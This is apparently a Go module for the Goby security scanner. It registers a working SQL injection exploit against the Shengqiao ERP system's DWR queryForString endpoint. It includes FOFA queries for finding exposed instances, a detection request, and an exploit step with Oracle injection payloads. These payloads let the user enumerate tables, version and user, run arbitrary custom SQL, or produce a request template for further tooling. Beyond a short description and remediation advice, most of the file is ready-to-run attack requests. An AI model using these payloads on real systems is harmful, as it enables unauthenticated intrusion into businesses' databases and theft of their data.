package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Shengqiao ERP System /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr SQL Injection Vulnerability",
    "Description": "<p>The Shengqiao ERP system is an enterprise-level management software developed by Hangzhou Shengqiao Technology Co., Ltd. It aims to provide enterprises with a comprehensive and integrated management solution to optimize resource allocation and improve efficiency. The system integrates multiple business modules such as finance, human resources, production, sales, and supply chain, achieving seamless connection and real-time sharing of internal and external information. It is suitable for enterprises of various sizes, especially those seeking to optimize resources, improve operational efficiency, and enhance management levels. The Shengqiao ERP system /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr interface has a SQL injection vulnerability, allowing attackers to execute arbitrary SQL statements by crafting malicious requests, potentially leading to sensitive information leakage or system compromise.</p>",
    "Product": "Shengqiao ERP System",
    "Homepage": "http://www.hzsage.com/",
    "DisclosureDate": "2024-12-02",
    "PostTime": "2024-12-05",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "title=\"圣乔ERP系统\" && body=\"圣乔ERP系统\"",
    "GobyQuery": "title=\"圣乔ERP系统\" && body=\"圣乔ERP系统\"",
    "Level": "2",
    "Impact": "<p>Unauthenticated remote attackers can exploit the SQL injection vulnerability to access sensitive database information (e.g., admin passwords, user personal information) and, in high-privilege cases, upload malicious files to gain further control over the server.</p>",
    "Recommendation": "<p>1. Disable public exposure of the system or set access permissions for interfaces.</p><p>2. Use a Web Application Firewall (WAF) to filter malicious requests.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/Yc4H6bEzJ0SjSy13dGB3xA"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1,SELECT * FROM v$version WHERE rownum = 1,SELECT USER FROM DUAL",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
                    "Connection": "close",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                    "Content-Type": "text/plain"
                },
                "data_type": "text",
                "data": "callCount=1\r\npage=\r\nhttpSessionId=\r\nscriptSessionId=\r\nc0-scriptName=NamedParameterSingleRowQueryConvertor\r\nc0-methodName=queryForString\r\nc0-id=0\r\nc0-param0=(SELECT CHR(102)||CHR(50)||CHR(109)||CHR(55)||CHR(106)||CHR(57)||CHR(110)||CHR(56)||CHR(100)||CHR(51)||CHR(112)||CHR(53)||CHR(113)||CHR(52)||CHR(114)||CHR(54)||CHR(115)||CHR(49)||CHR(116)||CHR(48)||CHR(117)||CHR(51)||CHR(118)||CHR(57) FROM DUAL)\r\nc0-param1=Object_Object:{}\r\nbatchId=0"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "f2m7j9n8d3p5q4r6s1t0u3v9",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulURL|define|variable|{{{fixedhostinfo}}}/erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
                    "Content-Type": "text/plain"
                },
                "data_type": "text",
                "data": "callCount=1\r\npage=\r\nhttpSessionId=\r\nscriptSessionId=\r\nc0-scriptName=NamedParameterSingleRowQueryConvertor\r\nc0-methodName=queryForString\r\nc0-id=0\r\nc0-param0=(SELECT CHR(126)||CHR(126)||({{{payload}}})|| CHR(126)||CHR(126) FROM DUAL)\r\nc0-param1=Object_Object:{}\r\nbatchId=0"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~([^'][\\s\\S]*?)~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}callCount=1{{{CRLF}}}page=/erp/dwr/test/NamedParameterSingleRowQueryConvertor{{{CRLF}}}httpSessionId=47CA299619667847F1BB450454E6C2D4{{{CRLF}}}scriptSessionId=F3F037EB7A5102043AD4CEB47EB17A7275{{{CRLF}}}c0-scriptName=NamedParameterSingleRowQueryConvertor{{{CRLF}}}c0-methodName=queryForString{{{CRLF}}}c0-id=0{{{CRLF}}}c0-param0=*{{{CRLF}}}c0-param1=Object_Object:{}{{{CRLF}}}batchId=0"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "圣乔ERP系统 /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr SQL 注入漏洞",
            "Product": "圣乔 ERP系统",
            "Description": "<p>圣乔ERP系统是杭州圣乔科技有限公司开发的一款企业级管理软件，旨在为企业提供一套全面、集成化的管理解决方案，帮助企业实现资源的优化配置和高效利用。该系统集成了财务、人力资源、生产、销售、供应链等多个业务模块，实现了企业内外部信息的无缝连接和实时共享。适用于各种规模的企业，特别是需要实现资源优化配置、提高运营效率和管理水平的企业。圣乔 ERP系统 /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr 接口存在SQL注入漏洞，攻击者可以通过构造恶意请求，执行任意SQL语句，进而可能导致敏感信息泄露或系统被控制。</p>",
            "Recommendation": "<p>1. 关闭互联网暴露面或接口设置访问权限。</p><p>2. 使用 Web 应用防火墙 (WAF) 过滤恶意请求。</p>",
            "Impact": "<p>未经身份验证的远程攻击者可以利用 SQL 注入漏洞获取数据库中的敏感信息（例如，管理员后台密码、用户个人信息），甚至在高权限的情况下向服务器中写入木马，进一步获取服务器系统权限。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Shengqiao ERP System /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr SQL Injection Vulnerability",
            "Product": "Shengqiao ERP System",
            "Description": "<p>The Shengqiao ERP system is an enterprise-level management software developed by Hangzhou Shengqiao Technology Co., Ltd. It aims to provide enterprises with a comprehensive and integrated management solution to optimize resource allocation and improve efficiency. The system integrates multiple business modules such as finance, human resources, production, sales, and supply chain, achieving seamless connection and real-time sharing of internal and external information. It is suitable for enterprises of various sizes, especially those seeking to optimize resources, improve operational efficiency, and enhance management levels. The Shengqiao ERP system /erp/dwr/call/plaincall/NamedParameterSingleRowQueryConvertor.queryForString.dwr interface has a SQL injection vulnerability, allowing attackers to execute arbitrary SQL statements by crafting malicious requests, potentially leading to sensitive information leakage or system compromise.</p>",
            "Recommendation": "<p>1. Disable public exposure of the system or set access permissions for interfaces.</p><p>2. Use a Web Application Firewall (WAF) to filter malicious requests.</p>",
            "Impact": "<p>Unauthenticated remote attackers can exploit the SQL injection vulnerability to access sensitive database information (e.g., admin passwords, user personal information) and, in high-privilege cases, upload malicious files to gain further control over the server.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "payload"
    ],
    "EditType": "fast",
    "PocId": "9975"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}